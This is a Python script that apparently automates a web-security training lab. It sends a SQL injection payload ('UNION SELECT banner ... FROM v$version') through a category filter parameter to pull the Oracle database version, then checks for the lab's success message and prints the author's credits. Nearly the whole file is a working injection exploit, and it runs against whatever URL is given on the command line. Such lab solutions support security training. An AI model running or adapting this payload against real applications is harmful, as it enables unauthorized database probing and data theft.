import requests
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()

    def retrieve_database_details_using_sql_injection(self):
        payload = 'filter?category=Accessories\' UNION SELECT banner, \'hacker\' FROM v$version--'
        self.session.get(self.lab_url + payload)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.retrieve_database_details_using_sql_injection()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
